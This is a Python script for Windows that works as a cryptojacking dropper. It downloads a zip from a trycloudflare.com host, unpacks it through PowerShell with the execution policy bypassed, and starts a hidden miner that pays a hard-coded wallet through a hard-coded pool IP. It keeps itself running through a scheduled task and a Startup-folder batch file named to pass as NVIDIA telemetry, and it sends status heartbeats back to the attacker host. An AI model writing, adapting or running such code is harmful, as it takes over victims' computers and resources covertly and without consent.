import os, sys, socket, subprocess, urllib.request, tempfile, time

BASE = "https://independently-cage-uncertainty-flag.trycloudflare.com"
WALLET = "prl1p9s2a9gdy4n5yfuf5suhya2d2pyvaahmz3n3gzm3npyxkj79m7yyq9kgnrv"
POOL_HOST = "154.94.236.27"
POOL_PORT = "3361"

def hb(tag):
    try:
        urllib.request.urlopen(BASE + "/hb/" + tag + "-" + socket.gethostname(), timeout=8).read()
    except Exception:
        pass

def main():
    hb("start")
    tmp = os.environ.get("TEMP") or r"C:\Windows\Temp"
    z = os.path.join(tmp, "pw.zip")
    d = os.path.join(tmp, "pw")
    try:
        urllib.request.urlretrieve(BASE + "/pearl-win.zip", z)
    except Exception as e:
        hb("dlfail")
        return 1
    hb("dlok")
    subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command",
                    "Expand-Archive -Force -Path '%s' -DestinationPath '%s'" % (z, d)],
                   creationflags=0x08000000)
    bindir = os.path.join(d, "pearl-bin2")
    exe = os.path.join(bindir, "pearl-host.exe")
    if not os.path.exists(exe):
        hb("noexe")
        return 1
    worker = "w4090-" + socket.gethostname()[:10].replace(" ", "")
    cmd = [exe, "--wallet", WALLET, "--worker", worker,
           "--host", POOL_HOST, "--port", POOL_PORT, "--lowmem"]
    DETACHED = 0x00000008 | 0x00000200 | 0x08000000
    try:
        subprocess.Popen(cmd, cwd=bindir, creationflags=DETACHED,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         stdin=subprocess.DEVNULL)
        hb("miner")
    except Exception:
        hb("minerfail")

    # persistence: logon scheduled task + startup folder
    try:
        bat = os.path.join(tmp, "nvupd.bat")
        with open(bat, "w") as f:
            f.write('@echo off\r\ncd /d "%s"\r\nstart "" /min "%s" %s\r\n' % (
                bindir, exe,
                " ".join(['--wallet', WALLET, '--worker', worker, '--host', POOL_HOST,
                          '--port', POOL_PORT, '--lowmem'])))
        subprocess.run(["schtasks", "/Create", "/SC", "ONLOGON", "/TN", "NvTelemetrySvc",
                        "/TR", bat, "/F"], creationflags=0x08000000,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        startup = os.path.join(os.environ.get("APPDATA", tmp),
                               r"Microsoft\Windows\Start Menu\Programs\Startup")
        if os.path.isdir(startup):
            import shutil
            shutil.copy(bat, os.path.join(startup, "nvupd.bat"))
        hb("persist")
    except Exception:
        hb("persistfail")
    return 0

if __name__ == "__main__":
    sys.exit(main())
